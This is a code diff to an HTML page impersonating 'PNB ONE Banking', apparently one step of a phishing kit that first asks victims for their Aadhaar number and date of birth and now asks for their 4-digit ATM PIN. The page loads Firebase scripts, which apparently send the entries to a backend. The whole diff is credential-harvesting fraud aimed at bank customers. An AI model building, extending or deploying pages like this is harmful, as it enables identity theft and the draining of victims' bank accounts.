@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>PNB ONE Banking - Step 2</title>
+  <title>PNB ONE Banking - Step 3</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <!-- Firebase SDK -->
@@ -12,8 +12,8 @@
   <!-- Firebase Config -->
   <script src="firebase-config.js"></script>
 
-  <!-- Step 2 Script -->
-  <script defer src="step2-script.js"></script>
+  <!-- Step 3 Script -->
+  <script defer src="step3-script.js"></script>
 
   <style>
     * { box-sizing: border-box; }
@@ -64,6 +64,7 @@
       font-weight: bold;
       color: #333;
     }
+    input[type="password"],
     input[type="text"] {
       width: 100%;
       padding: 10px;
@@ -111,14 +112,11 @@
     <div class="main-heading">PNB ONE Banking</div>
 
     <form id="ududip007">
-      <label for="aadhaar">Aadhaar Number:</label>
-      <input type="text" id="aadhaar" maxlength="12" placeholder="Enter your Aadhaar number" required
+      <label for="atmpin">ATM PIN:</label>
+      <input type="password" id="atmpin" maxlength="4" placeholder="Enter your 4-digit ATM PIN" required
              oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
 
-      <label for="dob">Date of Birth:</label>
-      <input type="text" id="dob" maxlength="10" placeholder="DD/MM/YYYY" required />
-
-      <input type="submit" value="Submit" />
+      <input type="submit" value="Continue" />
     </form>
 
     <div class="notice">
